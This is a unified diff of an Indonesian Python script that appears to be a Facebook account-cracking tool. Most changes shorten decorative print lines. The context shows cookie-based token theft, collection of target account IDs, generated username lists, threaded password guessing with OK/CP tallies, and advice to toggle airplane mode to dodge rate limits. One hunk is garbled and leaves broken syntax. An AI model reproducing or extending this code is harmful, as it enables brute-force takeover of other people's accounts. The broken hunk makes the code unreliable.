@@ -112,7 +112,7 @@ cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 	
 #----------[ ERROR ]----------#	       
 def help():
-	print(f"{kun}╭────────────────────────────────────────────{x}")
+	print(f"{kun}╭{x}")
 	krek_cer(f"{xx}└──[{xxx} pilih yg bener bro :-(")
 	login() 
 
@@ -152,7 +152,7 @@ def login():
 		except KeyError:
 			login_lagi()
 		except requests.exceptions.ConnectionError:
-			print(f"{kun}╭────────────────────────────────────────────{x}")
+			print(f"{kun}╭{x}")
 			krek_cer(f'{xx}└──[{xxx} Koneksi anda bermasalah :-( ');exit()
 	except IOError:
 		login_lagi()
@@ -161,7 +161,7 @@ def login():
 def login_lagi():
 	try:
 		os.system('clear');banner()
-		print(f"{kun}╭────────────────────────────────────────────{x}")
+		print(f"{kun}╭{x}")
 		your_cookies = input(f'{kun}└──[{x} Input cookies {hijo}: ')
 		with requests.Session() as r:
 		              r.headers.update({'content-type': 'application/x-www-form-urlencoded',
@@ -175,7 +175,7 @@ def login_lagi():
 		              })
 		              response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
 		              if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
-		               print(f"{kun}╭────────────────────────────────────────────{x}")
+		               print(f"{kun}╭{x}")
 		               krek_cer(f"{xx}└──[{xxx} Cookies anda Invalid :-(", end='\r');time.sleep(3.5);print("                     ", end='\r')
 		              else:
 		                  action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '');fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1);jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1);data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,
@@ -223,13 +223,13 @@ def login_lagi():
 		                          access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
 		                          ken = open(".token.txt", "w").write(access_token)
 		                          cok = open(".cok.txt", "w").write(your_cookies)
-		                          print(f"{kun}╭────────────────────────────────────────────{x}")
+		                          print(f"{kun}╭{x}")
 		                          print(f"{xx}└──[{hijo} Login berhasil jalankan ulang pythonnya");exit()
 		                      else:
-		                              print(f"{kun}╭────────────────────────────────────────────{x}")
+		                              print(f"{kun}╭{x}")
 		                              krek_cer(f"{xx}└──[{xxx} Login gagal cek tumbal lo ngab :-(")
 	except Exception as e:
-	       print(f"{kun}╭────────────────────────────────────────────{x}")
+	       print(f"{kun}╭{x}")
 	       krek_cer(f"{xx}└──[{xxx} Login gagal cek tumbal lo ngab :-(");os.system('rm -rf .cyxieoncokies.txt && rm -rf .cyxieontoken.txt');print(e);time.sleep(3);back()
 	
 #----------[ BAGIAN-MENU ]----------#
@@ -239,19 +239,19 @@ def menu(id,name):
 		cok = open('.cok.txt','r').read()
 	except IOError:
 		
-		print(f"{kun}╭────────────────────────────────────────────{x}")
+		print(f"{kun}╭{x}")
 		krek_cer("└──[{xxx} Cookies anda kedaluarsa :-(");time.sleep(3);login_lagi()
 	os.system('clear')
 	banner()
-	print(f"{kun}╭────────────────────────────────────────────{x}")
+	print(f"{kun}╭{x}")
 	print(f'{xx}└──[{x} User  Id : {hijo}{name}{x}')
 	print(f'{xx}└──[{x} Username : {hijo}{id}{x}')
-	print(f"{kun}╭────────────────────────────────────────────{x}")
+	print(f"{kun}╭{x}")
 	print(f'{xx}└──[{x} 01. Crack publik{x}')
 	print(f'{xx}└──[{x} 02. Crack email{x}')
 	print(f'{xx}└──[{x} 03. Cek result{x}')
 	print(f'{xx}└──[{x} 00. Hapus cokies{x}')
-	print(f"{kun}╭────────────────────────────────────────────{x}")
+	print(f"{kun}╭{x}")
 	team_creakerz = input(f'{xx}└──[{x} Input : ')
 	if team_creakerz in ['1','01']:
 		nge_publik()
@@ -262,7 +262,7 @@ def menu(id,name):
 		#cek_result()
 	elif team_creakerz in ['0','00']:
 		os.system('rm -rf .cyxieoncokies.txt && rm -rf .cyxieontoken.txt')
-		print(f"{kun}╭────────────────────────────────────────────{x}")
+		print(f"{kun}╭{x}")
 		krek_cer(f'{xx}└──[{xxx} Suckses hapus cookies')
 		back()
 	else:
@@ -276,18 +276,18 @@ def nge_publik():
 	except IOError:
 		exit()
 	try:
-		print(f"{kun}╭────────────────────────────────────────────{x}")
+		print(f"{kun}╭{x}")
 		jum = int(input(f'{xx}└──[{x} Berapa target : '))
 	except ValueError:
 		help()
 	if jum<1 or jum>100:
-	    print(f"{kun}╭────────────────────────────────────────────")
+	    print(f"{kun}╭")
 	    krek_cer(f'{xx}└──[{xxx} Gagal dump ');back()
 	ses=requests.Session()
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		print(f"{kun}╭────────────────────────────────────────────{x}")
+		print(f"{kun}╭{x}")
 		kl = input(f"{xx}└──[{x} Idz target ke "+str(yz)+f"{hijo} : ")
 		uid.append(kl)
 	for userr in uid:
@@ -302,28 +302,28 @@ def nge_publik():
 		except (KeyError,IOError):
 			pass
 		except requests.exceptions.ConnectionError:
-			print(f"{kun}╭────────────────────────────────────────────{x}")
+			print(f"{kun}╭{x}")
 			krek_cer(f'{xx}└──[{xxx} Sinyal problem')
 	try:
-		print(f"{kun}╭────────────────────────────────────────────{x}")
+		print(f"{kun}╭{x}")
 		print(f'{xx}└──[{x} Total Idz target {hijo}: '+str(len(id)))
 		atur_ter()
 	except requests.exceptions.ConnectionError:
-		print(f"{kun}╭────────────────────────────────────────────{x}")
+		print(f"{kun}╭{x}")
 		krek_cer(f'{xx}└──[{xxx} Sinyal problem')
 	except (KeyError,IOError):
-		print(f"{kun}╭────────────────────────────────────────────{x}")
+		print(f"{kun}╭{x}")
 		krek_cer(f'{xx}└──[{xxx} Pertemanan tidak publik ')
 		time.sleep(2)
 		back()								
 						
 #----------[ MENU-IDZ ]----------#		
 def atur_ter():
-	print(f"{kun}╭────────────────────────────────────────────{x}")
+	print(f"{kun}╭{x}")
 	print(f'{xx}└──[{x} 01. Idz tua ')
 	print(f'{xx}└──[{x} 02. Idz muda ')
 	print(f'{xx}└──[{x} 03. Idz random ')
-	print(f"{kun}╭────────────────────────────────────────────{x}")	
+	print(f"{kun}╭{x}")	
 	krek_idz = input(f'{xx}└──[{x} Input Idz : ')
 	if krek_idz in ['1','01']:
 		for tua in sorted(id):
@@ -345,10 +345,10 @@ def atur_ter():
 		help()
 		
 #----------[ MENU-METODE ]----------#
-	print(f"{kun}╭────────────────────────────────────────────{x}")
+	print(f"{kun}╭{x}")
 	print(f'{xx}└──[{x} 01. Validate ')
 	print(f'{xx}└──[{x} 02. Asyinc ')
-	print(f"{kun}╭────────────────────────────────────────────{x}")
+	print(f"{kun}╭{x}")
 	Url_nge_krek = input(f'{xx}└──[{x} Input url : ')
 	if Url_nge_krek in ['1','01']:
 		method.append('validate')
@@ -357,12 +357,12 @@ def atur_ter():
 	else:
 		method.append('validate')
 		
-	print(f"{kun}╭────────────────────────────────────────────{x}")
-	print(f"{kun}╭────────────────────────────────────────────{x}")
+	print(f"{kun}╭{x}")
+	print(f"{kun}╭{x}")
 	pwtambah=input(f"{xx}└──[{x} Input : ")
 	if pwtambah in ['y','Y']:
 		pwpluss.append('ya')
-		print(f"{kun}╭────────────────────────────────────────────{x}")	
+		print(f"{kun}╭{x}")	
 		pwku=input(f"{xx}└──[{x} Input pw : ")
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
@@ -370,15 +370,12 @@ def atur_ter():
 	else:
 		pwpluss.append('no')
 		
-		print(f"{kun}╭────────────────────────────────────────────{x}")	
 	
-	print(f"{xx}└──[{x} Tambahkan ua manual (y/t)")
-	print(f"{kun}╭────────────────────────────────────────────{x}")
-	uatambah = input(f"{xx}└──[{x} Input : ")
+	: ")
 	if uatambah in ['y','Ya','ya','Y']:
 		uadia.append('ya')
-		print(f"{kun}╭────────────────────────────────────────────{x}")
-		kontol = input(f"{xx}└──[{x} Input ua : ")
+		print(f"{kun}╭{x}")
+		
 		uamu.append(kontol)
 	else:
 		uadia.append('tidak')
@@ -387,9 +384,9 @@ def atur_ter():
 #----------[ BAGIAN-WORDLIST ]----------#	
 def passwrdxdx():
 	global prog,des
-	print(f"{kun}╭────────────────────────────────────────────{x}")
+	print(f"{kun}╭{x}")
 	print(f'{xx}└──[{x} MAINKAN MODE PESAWAT SETIAP 300 IDZ ')
-	print(f'{kun}└────────────────────────────────────────────{x}\n')
+	print(f'{kun}└{x}\n')
 	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 	des = prog.add_task('',total=len(id2))
 	with prog:
@@ -426,10 +423,10 @@ def passwrdxdx():
 				else:
 				    pool.submit(metod1,idf,pwv)
 				    
-	print(f"{kun}╭────────────────────────────────────────────{x}")
+	print(f"{kun}╭{x}")
 	print(f'{xx}└──[{x} OK {hijo}: %s'%(ok))
 	print(f'{xx}└──[{x} CP {kun}: %s'%(cp))
-	print(f"{kun}─────────────────────────────────────────────{x}")
+	print(f"{kun}─{x}")
 
 #----------[ METODE-VALIDATE ]----------#	
 def metod1(idf,pwv):
@@ -616,14 +613,14 @@ def nge_tumbal():
 	depan = "rahma","dinda","fajar","devanda","dwi","putri","gilang","ridho","refaldo","rendi"
 	belakang = "gaming","babi","freefire","sanjaya","fatimah","50","70","59","100"
 	global ok,cp
-	print(f"{kun}╭────────────────────────────────────────────")
+	print(f"{kun}╭")
 	username = console.input(f"└──[ Input Username : ")
 	
 	if "," in str(username):
 	   help()
-	print(f"{kun}╭────────────────────────────────────────────")
+	print(f"{kun}╭")
 	kumpulkan = console.input(f"└──[ Input Total Username : ")
-	print(f"{kun}╭────────────────────────────────────────────")
+	print(f"{kun}╭")
 		
 	for gimel in range(int(kumpulkan)):
 	       aa = username
@@ -641,11 +638,11 @@ def nge_tumbal():
 						
 #----------[ MENU-USERNAME ]----------#		
 def atur_dulu():
-	print(f"{kun}╭────────────────────────────────────────────{x}")
+	print(f"{kun}╭{x}")
 	print(f'{xx}└──[{x} 01. Idz tua ')
 	print(f'{xx}└──[{x} 02. Idz muda ')
 	print(f'{xx}└──[{x} 03. Idz random ')
-	print(f"{kun}╭────────────────────────────────────────────{x}")	
+	print(f"{kun}╭{x}")	
 	krek_idz = input(f'{xx}└──[{x} Input Idz : ')
 	if krek_idz in ['1','01']:
 		for tua in sorted(id):
@@ -666,14 +663,14 @@ def atur_dulu():
 	else:
 		help()
 	
-	print(f"{kun}╭────────────────────────────────────────────{x}")
+	print(f"{kun}╭{x}")
 	
 	print(f"{xx}└──[{x} Tambahkan pw manual (y/t)")	
-	print(f"{kun}╭────────────────────────────────────────────{x}")
+	print(f"{kun}╭{x}")
 	pwtambah=input(f"{xx}└──[{x} Input : ")
 	if pwtambah in ['y','Y']:
 		pwpluss.append('ya')
-		print(f"{kun}╭────────────────────────────────────────────{x}")	
+		print(f"{kun}╭{x}")	
 		pwku=input(f"{xx}└──[{x} Input pw : ")
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
@@ -685,9 +682,9 @@ def atur_dulu():
 #----------[ BAGIAN-WORDLIST ]----------#	
 def passwrdxnx():
 	global prog,des
-	print(f"{kun}╭────────────────────────────────────────────{x}")
+	print(f"{kun}╭{x}")
 	print(f'{xx}└──[{x} MAINKAN MODE PESAWAT SETIAP 300 IDZ ')
-	print(f'{kun}└────────────────────────────────────────────{x}\n')
+	print(f'{kun}└{x}\n')
 	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 	des = prog.add_task('',total=len(id2))
 	with prog:
@@ -723,10 +720,10 @@ def passwrdxnx():
 				else:
 				    pool.submit(crack,idf,pwv)
 				    
-	print(f"{kun}╭────────────────────────────────────────────{x}")
+	print(f"{kun}╭{x}")
 	print(f'{xx}└──[{x} OK {hijo}: %s'%(ok))
 	print(f'{xx}└──[{x} CP {kun}: %s'%(cp))
-	print(f"{kun}─────────────────────────────────────────────{x}")
+	print(f"{kun}─{x}")
 
 #----------[ METODE-ASYINC ]----------#	
 def crack(idf,pwv):
